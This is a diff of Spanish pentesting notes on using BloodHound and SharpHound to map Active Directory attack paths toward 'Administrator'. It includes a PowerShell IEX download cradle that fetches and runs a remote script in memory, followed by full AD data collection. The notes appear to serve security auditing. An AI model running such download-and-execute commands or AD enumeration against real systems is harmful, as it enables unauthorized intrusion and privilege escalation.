@@ -5,9 +5,10 @@ Tags: #AD #BloodHound #SharpHound #Kali #Parrot
 **BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.
 
 * [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries/tree/master/BloodHound_Custom_Queries)
+* [Bloodhound](https://www.kali.org/tools/bloodhound/)
 
 ```bash 
-❯ bloodhound-setup           # Inicia el neo4j 'http:localhost:7474'   
+❯ bloodhound-setup           # Iniciar el neo4j 'http:localhost:7474'   
 ❯ BloodHound --no-sandbox    # Ejecutar Bloodhound y se abre en la web 'http://localhost:8080/ui/login'
 
 Notas: 
@@ -30,9 +31,10 @@ Enumerar lo siguiente en BloodHound en 'Analysis':
 Una vez obtenido un usuario:
 
 # Manera 1
-	1. Agregar la opción 'Mark User as Owned'
-	2. Darle click al usuario y se seleccionará el menú 'Node Info'
-	3. Seleccionar la opción 'Reachable High Value Targets' para ver el camino y lo que deberiamos de hacer para ser usuario 'Administrator'
+1. Agregar la opción 'Mark User as Owned'
+2. Darle click al usuario y se seleccionará el menú 'Node Info'
+	1. Seleccionar la opción 'Reachable High Value Targets' para ver el camino y lo que deberiamos de hacer para ser usuario 'Administrator' en 'Overview'
+	2. Seleccionar 'First Degree Object Control' en 'Outbound control rights' para ver si el usuario contempla alguna acción 
 ```
 
 ## SharpHound 
@@ -40,7 +42,14 @@ Una vez obtenido un usuario:
 * [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
 * [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)
 
+```powershell 
+❯ Import-Module .\SharpHound.ps1       # Importar el modulo, tambien se puede hacer con el '.exe'
+
+❯ Invoke-BloodHound -CollectionMethod All
+```
+
 ```powershell
+# Importar el modulo en memoria
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
 
 ❯ Invoke-BloodHound -CollectionMethod All     
